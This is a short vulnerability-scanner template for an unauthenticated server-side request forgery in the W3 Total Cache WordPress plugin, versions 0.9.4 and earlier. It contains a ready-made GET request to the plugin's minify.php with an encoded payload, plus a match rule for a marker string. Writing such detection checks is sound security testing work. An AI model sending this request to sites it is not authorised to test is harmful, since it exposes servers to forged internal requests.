id: w3c-total-cache-ssrf
brief:
    title: Wordpress W3C Total Cache <= 0.9.4 - Server Side Request Forgery (SSRF)
    by: random_robbie
    level: medium
    about: The W3 Total Cache WordPress plugin was affected by an Unauthenticated Server Side Request Forgery (SSRF) security vulnerability.
    label:
        - wordpress
        - wp-plugin
        - cache
        - ssrf
        - wp
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/wp-content/plugins/w3-total-cache/pub/minify.php?file=yygpKbDS1y9Ky9TLSy0uLi3Wyy9KB3NLKkqUM4CyxUDpxKzECr30_Pz0nNTEgsxiveT8XAA.css'
      signs:
        - "on": word
          has:
            - NessusFileIncludeTest
          in: body
